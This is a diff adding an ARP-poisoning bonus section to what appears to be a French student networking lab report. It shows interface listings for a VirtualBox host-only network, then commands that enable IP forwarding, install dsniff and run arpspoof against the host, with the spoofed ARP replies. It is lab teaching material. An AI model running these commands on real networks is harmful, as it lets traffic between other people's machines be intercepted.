@@ -182,3 +182,72 @@ Statistiques Ping pour 2a00:1450:4007:810::200e:
 Durée approximative des boucles en millisecondes :
     Minimum = 22ms, Maximum = 26ms, Moyenne = 24ms
 ```
+
+# 3. Bonus : ARP poisoning
+
+Adresse MAC de la machine (0A-00-27-00-00-03) et son adresse IP (192.168.56.1) :
+
+```powershell
+Carte Ethernet Ethernet 2 :
+
+   Suffixe DNS propre à la connexion. . . :
+   Description. . . . . . . . . . . . . . : VirtualBox Host-Only Ethernet Adapter
+   Adresse physique . . . . . . . . . . . : 0A-00-27-00-00-03
+   DHCP activé. . . . . . . . . . . . . . : Non
+   Configuration automatique activée. . . : Oui
+   Adresse IPv6 de liaison locale. . . . .: fe80::2d55:5721:e80a:d617%3(préféré)
+   Adresse IPv4. . . . . . . . . . . . . .: 192.168.56.1(préféré)
+   Masque de sous-réseau. . . . . . . . . : 255.255.255.0
+   Passerelle par défaut. . . . . . . . . :
+   IAID DHCPv6 . . . . . . . . . . . : 688521255
+   DUID de client DHCPv6. . . . . . . . : 00-01-00-01-2D-E2-D0-D6-40-C2-BA-52-11-43
+   NetBIOS sur Tcpip. . . . . . . . . . . : Activé
+```
+
+Adresse MAC de la Virtual Machine (08:00:27:74:ed:73) :
+
+```powershell
+root@jawad-ubuntu:~# ip a
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host noprefixroute 
+       valid_lft forever preferred_lft forever
+2: enp0s3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:50:9f:52 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global dynamic noprefixroute enp0s3
+       valid_lft 84994sec preferred_lft 84994sec
+    inet6 fe80::a00:27ff:fe50:9f52/64 scope link 
+       valid_lft forever preferred_lft forever
+3: enp0s8: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc fq_codel state UP group default qlen 1000
+    link/ether 08:00:27:74:ed:73 brd ff:ff:ff:ff:ff:ff
+    inet 192.168.56.101/24 brd 192.168.56.255 scope global dynamic noprefixroute enp0s8
+       valid_lft 395sec preferred_lft 395sec
+    inet6 fe80::a990:d9fa:4fcb:e53f/64 scope link noprefixroute 
+       valid_lft forever preferred_lft forever
+```
+
+Configuration de l'ArpSpoofing :
+
+```powershell
+jawad@jawad-ubuntu:~$ sudo su -
+[sudo] password for jawad: 
+root@jawad-ubuntu:~# echo 1 > /proc/sys/net/ipv4/ip_forward
+root@jawad-ubuntu:~# apt install dsniff
+root@jawad-ubuntu:~# arpspoof -i enp0s8 192.168.56.1
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+8:0:27:74:ed:73 ff:ff:ff:ff:ff:ff 0806 42: arp reply 192.168.56.1 is-at 8:0:27:74:ed:73
+...
+```
+
+Resultat sur WireShark :
+
+*voir capture des packages (arpspoofing.pcap)*
